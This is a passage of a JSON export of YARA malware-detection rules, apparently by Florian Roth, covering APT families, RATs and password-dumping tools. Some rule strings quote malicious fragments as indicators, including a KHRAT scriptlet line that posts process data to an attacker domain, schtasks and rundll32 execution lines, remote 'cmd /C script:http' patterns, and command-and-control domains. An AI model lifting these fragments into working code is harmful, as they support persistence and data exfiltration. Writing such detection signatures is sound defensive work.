\"ws2_32.dQH\" fullword ascii\n      $s3 = \"HGFEDCBADCBA\" fullword ascii\n      $s4 = \"AWAVAUATWVSU\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( pe.imphash ( ) == \"6f03fb864ff388bac8680ac5303584be\" or all of them ) )\n}","date":"2017-09-12 11:11:11","description":"Detects malware from DrqgonFly APT report","minimum_yara":"1.7","name":"DragonFly_APT_Sep17_3_RID2E5C","reference":"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group","required_modules":["pe"],"rule_hash":"f1d6e70129f7341627c6d1b688214034","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule DragonFly_APT_Sep17_4_RID2E5D : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from DrqgonFly APT report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n      date = \"2017-09-12 11:11:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"screen.exe\" fullword wide\n      $s2 = \"PlatformInvokeUSER32\" fullword ascii\n      $s3 = \"GetDesktopImageF\" fullword ascii\n      $s4 = \"PlatformInvokeGDI32\" fullword ascii\n      $s5 = \"GetDesktopImage\" fullword ascii\n      $s6 = \"Too many arguments, going to store in current dir\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them )\n}","date":"2017-09-12 11:11:21","description":"Detects malware from DrqgonFly APT report","minimum_yara":"1.7","name":"DragonFly_APT_Sep17_4_RID2E5D","reference":"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group","required_modules":[],"rule_hash":"8884eaf6d00828032e2b42941b94f937","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Monsoon_APT_Malware_1_RID2EF6 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Monsoon APT\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.fortinet.com/2017/04/05/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-2\"\n      date = \"2017-09-08 11:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd.exe /c start \" fullword ascii\n      $s2 = \"\\\\Microsoft\\\\Templates\\\\\" fullword ascii\n      $s3 = \"\\\\Microsoft\\\\Windows\\\\\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"a0c824244f1d36ea1dd2759cf7599cd1\" or all of them ) )\n}","date":"2017-09-08 11:36:51","description":"Detects malware from Monsoon APT","minimum_yara":"1.7","name":"Monsoon_APT_Malware_1_RID2EF6","reference":"http://blog.fortinet.com/2017/04/05/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-2","required_modules":["pe"],"rule_hash":"b5f04265fadfca8e6c1fe8bbfa43a8fd","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Monsoon_APT_Malware_2_RID2EF7 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Monsoon APT\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.fortinet.com/2017/04/05/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-2\"\n      date = \"2017-09-08 11:37:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Microsoft\\\\Windows\\\\coco.exe\" fullword ascii\n      $x2 = \":\\\\System Volume Information\\\\config\" fullword ascii\n      $x3 = \" cscript.[BACKSPA[PAGE DO[CAPS LO[PAGE UPTPX498.dTPX499.d\" fullword wide\n      $s1 = \"\\\\Microsoft\\\\Templates\\\\msvcrt.dll\" fullword ascii\n      $s2 = \"%04d/%02d/%02d %02d:%02d:%02d - {%s}\" fullword wide\n      $s3 = \"wininet.dll    \" fullword ascii\n      $s4 = \"DMCZ0001.dat\" fullword ascii\n      $s5 = \"TZ0000001.dat\" fullword ascii\n      $s6 = \"\\\\MUT.dat\" fullword ascii\n      $s7 = \"ouemm/emm!!!!!!!!!!!!!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 3 of them ) )\n}","date":"2017-09-08 11:37:01","description":"Detects malware from Monsoon APT","minimum_yara":"1.7","name":"Monsoon_APT_Malware_2_RID2EF7","reference":"http://blog.fortinet.com/2017/04/05/in-depth-look-at-new-variant-of-monsoon-apt-backdoor-part-2","required_modules":[],"rule_hash":"a1e08ce4a31a1b6cf48df08f261611b8","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Rehashed_RAT_2_RID2C0C : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Rehashed RAT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations\"\n      date = \"2017-09-08 09:32:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"dalat.dulichovietnam.net\" fullword ascii\n      $x2 = \"web.Thoitietvietnam.org\" fullword ascii\n      $a1 = \"User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64)\" fullword ascii\n      $a2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3\" ascii\n      $s1 = \"GET /%s%s%s%s HTTP/1.1\" fullword ascii\n      $s2 = \"http://%s:%d/%s%s%s%s\" fullword ascii\n      $s3 = \"{521338B8-3378-58F7-AFB9-E7D35E683BF8}\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"9c4c648f4a758cbbfe28c8850d82f931\" or ( 1 of ( $x* ) or 3 of them ) ) ) or ( 4 of them )\n}","date":"2017-09-08 09:32:31","description":"Detects malware from Rehashed RAT incident","minimum_yara":"1.7","name":"Rehashed_RAT_2_RID2C0C","reference":"https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations","required_modules":["pe"],"rule_hash":"70b9fd72775c6fa868c819e580a6040e","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Rehashed_RAT_3_RID2C0D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Rehashed RAT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations\"\n      date = \"2017-09-08 09:32:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\BisonNewHNStubDll\\\\Release\\\\Goopdate.pdb\" fullword ascii\n      $s2 = \"psisrndrx.ebd\" fullword wide\n      $s3 = \"pbad exception\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 2 of them )\n}","date":"2017-09-08 09:32:41","description":"Detects malware from Rehashed RAT incident","minimum_yara":"1.7","name":"Rehashed_RAT_3_RID2C0D","reference":"https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations","required_modules":[],"rule_hash":"6749588122377de88f6f39ad88cf96a3","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule RevengeRAT_Sep17_RID2CB3 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects RevengeRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-04 10:00:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Nuclear Explosion.g.resources\" fullword ascii\n      $x3 = \"03C7F4E8FB359AEC0EEF0814B66A704FC43FB3A8\" fullword ascii\n      $x4 = \"5B1EE7CAD3DFF220A95D1D6B91435D9E1520AC41\" fullword ascii\n      $x5 = \"\\\\RevengeRAT\\\\\" ascii\n      $x6 = \"Revenge-RAT client has been successfully installed.\" ascii\n      $x7 = \"Nuclear Explosion.exe\" fullword ascii\n      $x8 = \" Revenge-RAT 201\" wide\n      $s1 = \"{11111-22222-20001-00001}\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of ( $x* ) ) or ( 3 of them )\n}","date":"2017-09-04 10:00:21","description":"Detects RevengeRAT malware","minimum_yara":"1.7","name":"RevengeRAT_Sep17_RID2CB3","reference":"Internal Research","required_modules":[],"rule_hash":"81d8787bba5a242fccd29fbf2221e518","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule KHRAT_Malware_RID2BB3 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects an Imphash of KHRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/\"\n      date = \"2017-08-31 09:17:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and pe.imphash ( ) == \"6a8478ad861f98f8428a042f74de1944\"\n}","date":"2017-08-31 09:17:41","description":"Detects an Imphash of KHRAT malware","minimum_yara":"1.7","name":"KHRAT_Malware_RID2BB3","reference":"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/","required_modules":["pe"],"rule_hash":"d38075a1976cb952026e204015620408","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_KHRAT_script_RID2CB8 : DEMO MAL T1053 T1085 {\n   meta:\n      description = \"Semiautomatic generated rule - file MAL_KHRAT_scritpt.js\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/\"\n      date = \"2017-08-31 10:01:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1053, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"CreateObject(\\\"WScript.Shell\\\").Run \\\"schtasks /create /sc MINUTE /tn\" ascii\n      $x2 = \"CreateObject(\\\"WScript.Shell\\\").Run \\\"rundll32.exe javascript:\\\"\\\"\\\\..\\\\mshtml,RunHTMLApplication\" ascii\n      $x3 = \"<registration progid=\\\"ff010f\\\" classid=\\\"{e934870c-b429-4d0d-acf1-eef338b92c4b}\\\" >\" fullword ascii\n   condition: \n      1 of them\n}","date":"2017-08-31 10:01:11","description":"Semiautomatic generated rule - file MAL_KHRAT_scritpt.js","minimum_yara":"1.7","name":"MAL_KHRAT_script_RID2CB8","reference":"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/","required_modules":[],"rule_hash":"841f1d94ddfa2b3051ea257b62ebe105","score":75,"tags":["DEMO","T1085","T1053","MAL"]},{"author":"Florian Roth","content":"rule MAL_KHRAT_scritplet_RID2DFD : DEMO FILE MAL {\n   meta:\n      description = \"Semiautomatic generated rule - file MAL_KHRAT_scritplet_RID2DFD.sct\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/\"\n      date = \"2017-08-31 10:55:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"http.open \\\"POST\\\", \\\"http://update.upload-dropbox[.]com/docs/tz/GetProcess.php\\\",False,\\\"\\\",\\\"\\\" \" fullword ascii\n      $x2 = \"Process=Process & Chr(32) & Chr(32) & Chr(32) & Obj.Description\" fullword ascii\n      $s1 = \"http.SetRequestHeader \\\"Content-Type\\\", \\\"application/json\\\" \" fullword ascii\n      $s2 = \"Dim http,WMI,Objs,Process\" fullword ascii\n      $s3 = \"Set Objs=WMI.InstancesOf(\\\"Win32_Process\\\")\" fullword ascii\n      $s4 = \"'WScript.Echo http.responseText \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x3f3c and filesize < 1KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2017-08-31 10:55:21","description":"Semiautomatic generated rule - file MAL_KHRAT_scritplet.sct","minimum_yara":"1.7","name":"MAL_KHRAT_scritplet_RID2DFD","reference":"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/","required_modules":[],"rule_hash":"7ba86301cf6f3e46c20740f3a8333ed1","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT12_Malware_Aug17_RID2D65 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects APT 12 Malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.macnica.net/blog/2017/08/post-fb81.html\"\n      date = \"2017-08-30 10:30:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == \"9ba915fd04f248ad62e856c7238c0264\" )\n}","date":"2017-08-30 10:30:01","description":"Detects APT 12 Malware","minimum_yara":"1.7","name":"APT12_Malware_Aug17_RID2D65","reference":"http://blog.macnica.net/blog/2017/08/post-fb81.html","required_modules":["pe"],"rule_hash":"389a7a0aba0ca219a35d24f7cce571cc","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule KeeThief_PS_RID2B18 : DEMO FILE HKTL {\n   meta:\n      description = \"Detects component of KeeTheft - KeePass dump tool - file KeeThief.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/HarmJ0y/KeeThief\"\n      date = \"2017-08-29 08:51:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$WMIProcess = Get-WmiObject win32_process -Filter \\\"ProcessID = $($KeePassProcess.ID)\\\"\" fullword ascii\n      $x2 = \"if($KeePassProcess.FileVersion -match '^2\\\\.') {\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7223 and filesize < 1000KB and ( 1 of ( $x* ) ) )\n}","date":"2017-08-29 08:51:51","description":"Detects component of KeeTheft - KeePass dump tool - file KeeThief.ps1","minimum_yara":"1.7","name":"KeeThief_PS_RID2B18","reference":"https://github.com/HarmJ0y/KeeThief","required_modules":[],"rule_hash":"1dfd6e704652d62558024be4ae61c0bc","score":75,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule KeeTheft_EXE_RID2B62 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects component of KeeTheft - KeePass dump tool - file KeeTheft.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/HarmJ0y/KeeThief\"\n      date = \"2017-08-29 09:04:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error: Could not create a thread for the shellcode\" fullword wide\n      $x2 = \"Could not find address marker in shellcode\" fullword wide\n      $x3 = \"GenerateDecryptionShellCode\" fullword ascii\n      $x4 = \"KeePassLib.Keys.KcpPassword\" fullword wide\n      $x5 = \"************ Found a CompositeKey! **********\" fullword wide\n      $x6 = \"*** Interesting... there are multiple .NET runtimes loaded in KeePass\" fullword wide\n      $x7 = \"GetKcpPasswordInfo\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}","date":"2017-08-29 09:04:11","description":"Detects component of KeeTheft - KeePass dump tool - file KeeTheft.exe","minimum_yara":"1.7","name":"KeeTheft_EXE_RID2B62","reference":"https://github.com/HarmJ0y/KeeThief","required_modules":[],"rule_hash":"023264599ccf314f19c3679624433716","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule KeeTheft_Out_Shellcode_RID2FAA : DEMO HKTL {\n   meta:\n      description = \"Detects component of KeeTheft - KeePass dump tool - file Out-Shellcode.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/HarmJ0y/KeeThief\"\n      date = \"2017-08-29 12:06:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Write-Host \\\"Shellcode length: 0x$(($ShellcodeLength + 1).ToString('X4'))\\\"\" fullword ascii\n      $x2 = \"$TextSectionInfo = @($MapContents | Where-Object { $_ -match '\\\\.text\\\\W+CODE' })[0]\" fullword ascii\n   condition: \n      ( filesize < 2KB and 1 of them )\n}","date":"2017-08-29 12:06:51","description":"Detects component of KeeTheft - KeePass dump tool - file Out-Shellcode.ps1","minimum_yara":"1.7","name":"KeeTheft_Out_Shellcode_RID2FAA","reference":"https://github.com/HarmJ0y/KeeThief","required_modules":[],"rule_hash":"d24c08205aa10b61f058be56607f5409","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule Hacktool_PasswordsPro_RID2F9C : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - file PasswordsPro.exe\"\n      author = \"Florian Roth\"\n      reference = \"PasswordPro\"\n      date = \"2017-08-27 12:04:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"No users marked for attack or all marked users already have passwords found!\" fullword ascii\n      $s2 = \"%s\\\\PasswordsPro.ini.Dictionaries(%d)\" fullword ascii\n      $s3 = \"Passwords processed since attack start:\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )\n}","date":"2017-08-27 12:04:31","description":"Semiautomatic generated rule - file PasswordsPro.exe","minimum_yara":"1.7","name":"Hacktool_PasswordsPro_RID2F9C","reference":"PasswordPro","required_modules":[],"rule_hash":"c1b3ea81d16beeaee970533cb07a26b9","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule PasswordPro_NTLM_DLL_RID2E6A : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - file NTLM.dll\"\n      author = \"Florian Roth\"\n      reference = \"PasswordPro\"\n      date = \"2017-08-27 11:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NTLM.dll\" fullword ascii\n      $s2 = \"Algorithm: NTLM\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and pe.exports ( \"GetHash\" ) and pe.exports ( \"GetInfo\" ) and ( all of them ) )\n}","date":"2017-08-27 11:13:31","description":"Semiautomatic generated rule - file NTLM.dll","minimum_yara":"1.7","name":"PasswordPro_NTLM_DLL_RID2E6A","reference":"PasswordPro","required_modules":["pe"],"rule_hash":"342a937d9df3dadd0fe5887f4d02d241","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule JavaScript_Run_Suspicious_RID3132 : DEMO SCRIPT T1064 {\n   meta:\n      description = \"Detects a suspicious Javascript Run command\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/craiu/status/900314063560998912\"\n      date = \"2017-08-23 13:12:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"w = new ActiveXObject(\" ascii\n      $s2 = \" w.Run(r);\" fullword ascii\n   condition: \n      all of them\n}","date":"2017-08-23 13:12:11","description":"Detects a suspicious Javascript Run command","minimum_yara":"1.7","name":"JavaScript_Run_Suspicious_RID3132","reference":"https://twitter.com/craiu/status/900314063560998912","required_modules":[],"rule_hash":"d05dcd536febf6738cf028f84fa59284","score":60,"tags":["DEMO","T1064","SCRIPT"]},{"author":"Florian Roth","content":"rule Datper_Backdoor_RID2CF5 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Datper Malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.jpcert.or.jp/2017/08/detecting-datper-malware-from-proxy-logs.html\"\n      date = \"2017-08-21 10:11:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"RtlGetCo\" fullword ascii\n      $s2 = \"hutils\" fullword ascii\n      $s3 = \"kza2FWU,f;\\\"3U&zpa3U(W`J\" fullword ascii\n      $c1 = \"dkkwldngn\" fullword ascii\n      $c2 = \"ndkkwqgcm\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"58db98e2334746d349d607e4d73bc5ea\" or pe.imphash ( ) == \"8fbed921458af485ce84fb7d9b13899e\" or ( 2 of ( $s* ) and 1 of ( $c* ) ) or ( $s3 and $c1 ) ) )\n}","date":"2017-08-21 10:11:21","description":"Detects Datper Malware","minimum_yara":"1.7","name":"Datper_Backdoor_RID2CF5","reference":"http://blog.jpcert.or.jp/2017/08/detecting-datper-malware-from-proxy-logs.html","required_modules":["pe"],"rule_hash":"3cb4f12c84f36ac49b64842222f56d8b","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Suspicious_Script_Running_from_HTTP_RID350E : DEMO SCRIPT T1064 {\n   meta:\n      description = \"Detects a suspicious \"\n      author = \"Florian Roth\"\n      reference = \"https://www.hybrid-analysis.com/sample/a112274e109c5819d54aa8de89b0e707b243f4929a83e77439e3ff01ed218a35?environmentId=100\"\n      date = \"2017-08-20 15:56:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd /C script:http://\" ascii nocase\n      $s2 = \"cmd /C script:https://\" ascii nocase\n      $s3 = \"cmd.exe /C script:http://\" ascii nocase\n      $s4 = \"cmd.exe /C script:https://\" ascii nocase\n   condition: \n      1 of them\n}","date":"2017-08-20 15:56:51","description":"Detects a suspicious ","minimum_yara":"1.7","name":"Suspicious_Script_Running_from_HTTP_RID350E","reference":"https://www.hybrid-analysis.com/sample/a112274e109c5819d54aa8de89b0e707b243f4929a83e77439e3ff01ed218a35?environmentId=100","required_modules":[],"rule_hash":"9aea42700ef9b213c29a5e46d66c2707","score":50,"tags":["DEMO","T1064","SCRIPT"]},{"author":"Florian Roth","content":"rule Reflective_DLL_Loader_Aug17_1_RID317F : DEMO EXE FILE HKTL T1055 {\n   meta:\n      description = \"Detects Reflective DLL Loader\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-20 13:25:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1055\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\reflective_dll.pdb\" ascii\n      $x2 = \"reflective_dll.x64.dll\" fullword ascii\n      $s3 = \"DLL Injection\" fullword ascii\n      $s4 = \"?ReflectiveLoader@@YA_KPEAX@Z\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"4bf489ae7d1e6575f5bb81ae4d10862f\" or pe.exports ( \"?ReflectiveLoader@@YA_KPEAX@Z\" ) or ( 1 of ( $x* ) or 2 of them ) ) ) or ( 2 of them )\n}","date":"2017-08-20 13:25:01","description":"Detects Reflective DLL Loader","minimum_yara":"1.7","name":"Reflective_DLL_Loader_Aug17_1_RID317F","reference":"Internal Research","required_modules":["pe"],"rule_hash":"9038b82b917ab5625a2a6e23808e66c2","score":75,"tags":["T1055","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule DLL_Injector_Lynx_RID2D94 : DEMO EXE FILE HKTL T1055 {\n   meta:\n      description = \"Detects Lynx DLL Injector\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-20 10:37:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1055\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \" -p <TARGET PROCESS NAME> | -u <DLL PAYLOAD> [--obfuscate]\" fullword wide\n      $x2 = \"You've selected to inject into process: %s\" fullword wide\n      $x3 = \"Lynx DLL Injector\" fullword wide\n      $x4 = \"Reflective DLL Injector\" fullword wide\n      $x5 = \"Failed write payload: %lu\" fullword wide\n      $x6 = \"Failed to start payload: %lu\" fullword wide\n      $x7 = \"Injecting payload...\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of them ) or ( 3 of them )\n}","date":"2017-08-20 10:37:51","description":"Detects Lynx DLL Injector","minimum_yara":"1.7","name":"DLL_Injector_Lynx_RID2D94","reference":"Internal Research","required_modules":[],"rule_hash":"072ab30488dc228516251ee898963fc2","score":75,"tags":["T1055","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Reflective_DLL_Loader_Aug17_2_RID3180 : DEMO EXE FILE HKTL T1055 {\n   meta:\n      description = \"Detects Reflective DLL Loader - suspicious - Possible FP could be program crack\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-20 13:25:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1055\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\ReflectiveDLLInjection-master\\\\\" ascii\n      $s2 = \"reflective_dll.dll\" fullword ascii\n      $s3 = \"DLL injection\" fullword ascii\n      $s4 = \"_ReflectiveLoader@4\" fullword ascii\n      $s5 = \"Reflective Dll Injection\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"59867122bcc8c959ad307ac2dd08af79\" or pe.exports ( \"_ReflectiveLoader@4\" ) or 2 of them ) ) or ( 3 of them )\n}","date":"2017-08-20 13:25:11","description":"Detects Reflective DLL Loader - suspicious - Possible FP could be program crack","minimum_yara":"1.7","name":"Reflective_DLL_Loader_Aug17_2_RID3180","reference":"Internal Research","required_modules":["pe"],"rule_hash":"dd8911ec43dd2ba1562ea427b01ca65b","score":60,"tags":["T1055","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Reflective_DLL_Loader_Aug17_3_RID3181 : DEMO EXE FILE HKTL T1055 {\n   meta:\n      description = \"Detects Reflective DLL Loader\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-20 13:25:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1055\"\n      required_modules = 